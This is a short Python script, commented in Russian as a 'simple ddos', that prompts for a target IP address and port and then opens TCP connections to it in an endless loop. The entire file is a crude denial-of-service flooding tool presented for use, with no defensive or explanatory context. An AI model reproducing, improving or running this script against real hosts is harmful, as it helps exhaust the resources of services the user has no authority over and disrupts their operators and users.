#симпле додос777
import socket

ip = input("Введи ип: ")
port = int(input("Введи порт: "))
while True:
	socket.socket().connect((ip, port))
	print("Реконнект к" + ip)